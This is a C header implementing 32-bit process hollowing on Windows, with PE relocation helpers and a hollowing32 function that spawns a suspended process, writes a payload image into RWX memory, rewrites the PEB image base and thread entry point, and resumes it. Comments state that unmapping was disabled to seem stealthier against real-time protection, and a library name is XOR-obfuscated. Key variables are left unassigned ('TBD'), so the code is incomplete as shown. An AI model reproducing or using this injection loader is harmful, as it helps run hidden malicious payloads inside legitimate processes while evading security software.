#pragma once


#include <windows.h>
#include <string.h>
#include <stdio.h>
#include "../debug_print/debug_print.h"


#define false 0
#define true 1
typedef int bool;

#define RELOC_32BIT_FIELD 3
#define RELOC_64BIT_FIELD 10


IMAGE_NT_HEADERS* get_nt_hdrs(BYTE *pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > kMaxOffset) return NULL;

    IMAGE_NT_HEADERS *inh = (IMAGE_NT_HEADERS *)((BYTE*)pe_buffer + pe_offset);
    return inh;
}


IMAGE_DATA_DIRECTORY* get_pe_directory(PVOID pe_buffer, DWORD dir_id)
{
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {		
		return NULL;
	}
		
    //fetch relocation table from current image:
    PIMAGE_NT_HEADERS nt_headers = get_nt_hdrs((BYTE*) pe_buffer);
    if (nt_headers == NULL) {		
		return NULL;
	}

    IMAGE_DATA_DIRECTORY* peDir = &(nt_headers->OptionalHeader.DataDirectory[dir_id]);
	
	#ifdef X64
		if (((PVOID) ((DWORD64) peDir->VirtualAddress)) == NULL) {			
			return NULL;
		}
	#else
		if (((PVOID) peDir->VirtualAddress) == NULL) {
			return NULL;
		}		
	#endif
	
    return peDir;
}


bool is32Bit(PVOID payloadData) {
	PIMAGE_DOS_HEADER payloadDosHeader;
	PIMAGE_NT_HEADERS payloadNtHeader;
	
	// Get payload headers
	payloadDosHeader = (PIMAGE_DOS_HEADER) payloadData;
	payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);
	
	if(payloadNtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
		return true;
	} else {
		return false;
	}	
}


typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type: 4;
} BASE_RELOCATION_ENTRY;


bool has_relocations(BYTE *pe_buffer)
{
    IMAGE_DATA_DIRECTORY* relocDir = get_pe_directory(pe_buffer, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (relocDir == NULL) {
        return false;
    }
    return true;
}


bool apply_reloc_block(BASE_RELOCATION_ENTRY *block, SIZE_T entriesNum, DWORD page, ULONGLONG oldBase, ULONGLONG newBase, PVOID modulePtr)
{
	DWORD *relocateAddr32;
	ULONGLONG *relocateAddr64;
	BASE_RELOCATION_ENTRY* entry = block;
	SIZE_T i = 0;
	for (i = 0; i < entriesNum; i++) {
		DWORD offset = entry->Offset;
		DWORD type = entry->Type;
		
		if (entry == NULL || type == 0) {
			break;
		}
				
		switch(type) {
			case RELOC_32BIT_FIELD:
				relocateAddr32 = (DWORD*) ((ULONG_PTR) modulePtr + page + offset);
				(*relocateAddr32) = (DWORD) (*relocateAddr32) - oldBase + newBase;
				entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) entry + sizeof(WORD));	
				break;
			#ifdef X64
				case RELOC_64BIT_FIELD:
					relocateAddr64 = (ULONGLONG*) ((ULONG_PTR) modulePtr + page + offset);
					(*relocateAddr64) = ((ULONGLONG) (*relocateAddr64)) - oldBase + newBase;
					entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) entry + sizeof(WORD));	
					break;
			#endif	
			default:
				DEBUG_PRINT("Not supported relocations format at %d: %d\n", (int) i, type);
				return false;
		}								
				
	}
	//printf("[+] Applied %d relocations\n", (int) i);
	return true;		
}

				
bool apply_relocations(ULONGLONG newBase, ULONGLONG oldBase, PVOID modulePtr)
{
    IMAGE_DATA_DIRECTORY* relocDir = get_pe_directory(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (relocDir == NULL) {
        DEBUG_PRINT("Cannot relocate - application have no relocation table!\n");
        return false;
    }
    DWORD maxSize = relocDir->Size;
    DWORD relocAddr = relocDir->VirtualAddress;

    IMAGE_BASE_RELOCATION* reloc = NULL;

    DWORD parsedSize = 0;
    while (parsedSize < maxSize) {
        reloc = (IMAGE_BASE_RELOCATION*)(relocAddr + parsedSize + (ULONG_PTR) modulePtr);
        parsedSize += reloc->SizeOfBlock;
		
		#ifdef X64
			if ((((ULONGLONG*) ((ULONGLONG) reloc->VirtualAddress)) == NULL) || (reloc->SizeOfBlock == 0)) {
				continue;
			}
		#else
			if ((((DWORD*) reloc->VirtualAddress) == NULL) || (reloc->SizeOfBlock == 0)) {
				continue;
			}
		#endif
				
        //printf("RelocBlock: %x %x\n", reloc->VirtualAddress, reloc->SizeOfBlock);
        
        size_t entriesNum = (reloc->SizeOfBlock - 2 * sizeof(DWORD))  / sizeof(WORD);
        DWORD page = reloc->VirtualAddress;

        BASE_RELOCATION_ENTRY* block = (BASE_RELOCATION_ENTRY*)((ULONG_PTR) reloc + sizeof(DWORD) + sizeof(DWORD));
        if (apply_reloc_block(block, entriesNum, page, oldBase, newBase, modulePtr) == false) {
            return false;
        }
    }
    return true;
}


void hollowing32(unsigned char *payload, char *payload_info) {
	// NtUnmapViewOfSection callNtUnmapViewOfSection;
	STARTUPINFOA targetStartupInfo;
	PROCESS_INFORMATION targetProcessInfo;
	PIMAGE_DOS_HEADER payloadDosHeader;
	PIMAGE_NT_HEADERS payloadNtHeader;
	PIMAGE_SECTION_HEADER payloadSectionHeader;
	CONTEXT targetContext;
	DWORD oldTargetImageBase;
	DWORD newTargetImageBase;
	DWORD desiredPayloadImageBase;
	LPVOID localPayloadCopy;


    // "Old" parameters from original BFG function newRunPE32.
    // Perform some wrapping process to transform the hollowing32 parameter values into original values
    LPSTR targetPath;
    PVOID payloadData;
    LPTSTR commandLine;
    // TBD

		
	// Obfuscated function name string (keyByte is 0x45)	
	// unsigned char obfuscatedNtUnmapViewOfSection[21] = {0x0b, 0x31, 0x10, 0x2b, 0x28, 0x24, 0x35, 0x13, 0x2c, 0x20, 0x32, 0x0a, 0x23, 0x16, 0x20, 0x26, 0x31, 0x2c, 0x2a, 0x2b, 0x45};
	
	// Obfuscated library name string (keyByte is 0x56)
	unsigned char obfuscatedNtDll[10] = {0x38, 0x22, 0x32, 0x3a, 0x3a, 0x78, 0x32, 0x3a, 0x3a, 0x56};
	
	// Init info structures for target process instanciation
	RtlZeroMemory(&targetStartupInfo, sizeof(targetStartupInfo));
	RtlZeroMemory(&targetProcessInfo, sizeof(targetProcessInfo));
	
	// Create new instance of target process
	if(!CreateProcessA(targetPath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &targetStartupInfo, &targetProcessInfo)) {
		DEBUG_PRINT("Failed to create target process.\n");
		return;
	} else {
		DEBUG_PRINT("Target process instanciated.\n");
	}
	
	// Get thread context of target process
	targetContext.ContextFlags = CONTEXT_FULL;
	if(GetThreadContext(targetProcessInfo.hThread, (LPCONTEXT) &targetContext) == 0) {
		DEBUG_PRINT("GetThreadContext for target process main thread failed.\n");
		return;
	} else {
		DEBUG_PRINT("Retrieved target main thread context.\n");
	}
	
	// Get payload headers
	payloadDosHeader = (PIMAGE_DOS_HEADER) payloadData;
	payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);	
	
	// Patch payload subsystem to avoid crashes
	payloadNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;	
	
	// Get target process image base (ebx = PEB base address)
	if(ReadProcessMemory(targetProcessInfo.hProcess, (LPCVOID) (targetContext.Ebx + 8), (LPVOID) (&oldTargetImageBase), sizeof(DWORD), NULL) == 0)	{
		DEBUG_PRINT("Failed to read target process image base from PEB at address 0x%lX\n", targetContext.Ebx + 8);
		return;
	} else {
		DEBUG_PRINT("Old target process image base is 0x%lX\n", oldTargetImageBase);	
	}
			
	// Section unmapping disabled to appear more stealthy against real time protection
	// Unmap old target process image (always)		
	//callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA(deobfuscate(obfuscatedNtDll, 10, 0x56)), deobfuscate(obfuscatedNtUnmapViewOfSection, 21, 0x45)));
	//if(callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) oldTargetImageBase) == ERROR_SUCCESS) {
	//	DEBUG_PRINT("Unmapped old target process image.\n");
	//} else {
	//	DEBUG_PRINT("Failed to unmap old target process image.\n");
	//	return;
	//}	
	
	desiredPayloadImageBase = payloadNtHeader->OptionalHeader.ImageBase;
	DEBUG_PRINT("Desired image base of payload is 0x%lX\n", payloadNtHeader->OptionalHeader.ImageBase);	
	
	// Try to allocate memory in target process
	DEBUG_PRINT("Trying to allocate memory in target process...\n");
	
	// Payload can handle relocations - let the OS decide where to map the payload
	if(has_relocations(payloadData)) {
		DEBUG_PRINT("Found reloc section in payload executable. Choosing dynamic base allocation.\n");
		newTargetImageBase = (DWORD) VirtualAllocEx(targetProcessInfo.hProcess, NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	// Payload can't handle relocations: Try to get the desired image base. Procedure will fail if this address is unavailable
	} else {
		DEBUG_PRINT("Payload has no reloc section and must use fixed image base.\n");		
		newTargetImageBase = (DWORD) VirtualAllocEx(targetProcessInfo.hProcess, (LPVOID) desiredPayloadImageBase, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}
		
	if(newTargetImageBase == 0) {		
		DEBUG_PRINT("Failed to allocate memory.\n");
		return;
	} else {
		DEBUG_PRINT("Allocated memory in target process!\n");
	}
		
	// Arbitary allocation successful
	DEBUG_PRINT("New memory region has size 0x%lX bytes, at address 0x%lX.\n", payloadNtHeader->OptionalHeader.SizeOfImage, newTargetImageBase);
		
	// Fix image base in payload optional header to where memory could be actually allocated in target process
	payloadNtHeader->OptionalHeader.ImageBase = newTargetImageBase;
	DEBUG_PRINT("Adjusted OptionalHeader.ImageBase in payload to point to the actually allocated memory in target process.\n");
	
	// Allocate local buffer in which the image can be prepared
	localPayloadCopy = VirtualAlloc(NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	if(localPayloadCopy == 0) {
		DEBUG_PRINT("Failed to allocate local memory for image preparation.\n");
		return;
	} else {
		DEBUG_PRINT("Allocated local memory to prepare payload image before copying.\n");
	}
	
	// Fill local copy with section headers and section data
	memcpy(localPayloadCopy, payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders);
	DEBUG_PRINT("Wrote payload headers into local copy.\n");
	
	for(int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
		payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadNtHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		
		// No checking for SizeOfRawData == 0 needed because memcpy automatically skips copying without generating errors in that case
		memcpy((BYTE *) localPayloadCopy + payloadSectionHeader->VirtualAddress, (BYTE *) payloadData + payloadSectionHeader->PointerToRawData, payloadSectionHeader->SizeOfRawData);
		DEBUG_PRINT("Wrote section %d to local copy, virtual address offset of section is 0x%lX.\n", i, payloadSectionHeader->VirtualAddress);		
	}	
	
	// Apply relocations if VirtualAllocEx did not deliver the desired image base address
	if(newTargetImageBase != desiredPayloadImageBase) {
		DEBUG_PRINT("Payload not mapped at desired image base, applying relocations...\n");
		if(apply_relocations((ULONGLONG) newTargetImageBase, (ULONGLONG) desiredPayloadImageBase, localPayloadCopy) == false) {
			DEBUG_PRINT("Applying relocations to local copy failed.\n");
			return;
		} else {
			DEBUG_PRINT("Applied relocations to local payload copy.\n");
		}
	} else {
		DEBUG_PRINT("Image is at desired base, skipping relocations.\n");
	}
		
	// Image prepared. Write the local copy into the target process
	if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) newTargetImageBase, localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, NULL) == 0) {
		DEBUG_PRINT("Failed to write local payload copy into target process.\n");
		return;
	} else {
		DEBUG_PRINT("Wrote local payload copy into target process.\n");
	}
		
	// Fix image base in target PEB (ebx = PEB base address)
	if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext.Ebx + 8), (LPCVOID) &newTargetImageBase, sizeof(DWORD), NULL) == 0) {
		DEBUG_PRINT("Failed to fix target image base in PEB.\n");
		return;
	} else { 
		DEBUG_PRINT("Fixed target image base in PEB to 0x%lX\n", newTargetImageBase);
	}	
	
	// Set new entry point in target main thread context
	targetContext.Eax = newTargetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
	if(!SetThreadContext(targetProcessInfo.hThread, &targetContext)) {
		DEBUG_PRINT("Setting thread context for target main thread failed.\n");
		return;
	} else {
		DEBUG_PRINT("Set thread context for target main thread. New entry point is 0x%lX.\n", targetContext.Eax);
	}
	
	// Free the local payload copy
	VirtualFree(localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_FREE);	
	
	// Resume main thread of target process
	if(ResumeThread(targetProcessInfo.hThread) == -1) {
		DEBUG_PRINT("Failed to resume target main thread.\n");
	} else {
		DEBUG_PRINT("Resumed target main thread.\n");
	}
	
	// Cleanup
	CloseHandle(targetProcessInfo.hThread);
	CloseHandle(targetProcessInfo.hProcess);
}
